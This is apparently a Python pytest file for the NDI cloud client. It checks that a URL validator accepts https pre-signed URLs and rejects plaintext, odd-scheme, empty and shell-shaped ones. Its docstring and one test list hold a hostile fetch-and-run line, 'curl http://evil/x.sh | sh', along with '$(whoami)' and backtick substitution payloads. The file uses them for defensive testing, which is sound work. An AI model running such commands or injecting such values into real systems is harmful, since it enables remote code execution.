"""A server-supplied transfer URL is checked before anything is sent to it.

MATLAB counterpart: ``ndi.cloud.api.implementation.files.assertSafeCurlArgs``
(NDI-matlab ``605416a26``).

Half of that fix has no counterpart here. MATLAB built a curl command with
``sprintf`` and ran it through ``system()``, so a ``downloadUrl`` carrying
``"; curl http://evil/x.sh | sh; echo "`` executed as the user -- double
quotes do not neutralise command substitution in sh. Python transfers
through ``requests``: no shell, no interpolation, nothing of that kind to
inject into.

The other half ports, and is what these check: the URL must be ``https``
with a real host. These URLs come verbatim from ``getFileDetails`` and the
upload-URL endpoints, so they are attacker-controllable for any dataset a
user touches, and an ``http://`` one would carry both the file and the
pre-signed URL's own query-string credential in plaintext.
"""

from __future__ import annotations

import pytest

from ndi.cloud.api._validators import assert_safe_transfer_url

PRESIGNED = "https://bucket.s3.amazonaws.com/uid?X-Amz-Signature=abc&X-Amz-Expires=900"


class TestAGenuinePresignedUrlIsAccepted:
    def test_it_passes_through_unchanged(self):
        assert assert_safe_transfer_url(PRESIGNED) == PRESIGNED

    @pytest.mark.parametrize(
        "url",
        [
            "https://host/path",
            "https://host:8443/path?a=1&b=2",
            "https://sub.domain.example.com/a/b/c.bin?sig=x%2Fy%2Bz",
        ],
    )
    def test_ordinary_shapes_are_fine(self, url):
        """'&', '?', '=' and percent-encoding are normal in a signed URL."""
        assert assert_safe_transfer_url(url) == url


class TestTheDowngradeIsRefused:
    """The half of MATLAB's fix that does port."""

    def test_http_is_rejected(self):
        with pytest.raises(ValueError, match="must be https"):
            assert_safe_transfer_url("http://host/path", what="download URL")

    @pytest.mark.parametrize("url", ["ftp://host/x", "file:///etc/passwd", "//host/x"])
    def test_any_other_scheme_is_rejected(self, url):
        with pytest.raises(ValueError):
            assert_safe_transfer_url(url)

    def test_a_url_with_no_host_is_rejected(self):
        with pytest.raises(ValueError, match="names no host"):
            assert_safe_transfer_url("https:///just/a/path")


class TestTheShellShapedOnesAreRefusedToo:
    """No shell runs these, so this is belt and braces -- but a URL
    carrying a quote or a newline is not a URL anyone should transfer to,
    and refusing it costs nothing."""

    @pytest.mark.parametrize(
        "url",
        [
            'https://host/a"; curl http://evil/x.sh | sh; echo "',
            "https://host/a`whoami`",
            "https://host/a$(whoami)",
            "https://host/a\\b",
            "https://host/a b",
            "https://host/a\nb",
            "https://host/a\x00b",
        ],
    )
    def test_it_is_rejected(self, url):
        with pytest.raises(ValueError):
            assert_safe_transfer_url(url)


class TestEmptyIsRejected:
    @pytest.mark.parametrize("url", ["", "   ", None])
    def test_nothing_to_transfer_to(self, url):
        with pytest.raises(ValueError, match="empty"):
            assert_safe_transfer_url(url)


class TestTheCallSitesUseIt:
    """The guard existing is not the same as the guard being reached."""

    def test_the_file_download_refuses_a_plaintext_url(self, tmp_path, monkeypatch):
        from ndi.cloud.api import files as files_api

        monkeypatch.setattr(
            files_api, "getFileDetails", lambda *a, **k: {"downloadUrl": "http://evil/x"}
        )
        import ndi.cloud.download as download

        # A refused URL is logged and skipped, not raised: one bad file must
        # not abandon the rest of a dataset download.
        got = download.downloadFilesForDocument(
            "65a1b2c3d4e5f60718293a4b",
            {"file_uid": "abc123"},
            tmp_path,
            client=object(),
        )
        assert got == []
        assert list(tmp_path.iterdir()) == []

    def test_the_bulk_zip_download_raises_on_a_plaintext_url(self):
        """No partial result to fall back to here -- this call returns the
        documents themselves, so a refusal has to be loud."""
        import ndi.cloud.download as download

        with pytest.raises(ValueError, match="bulk download URL"):
            download._download_chunk_zip("http://evil/bundle.zip", timeout=1)
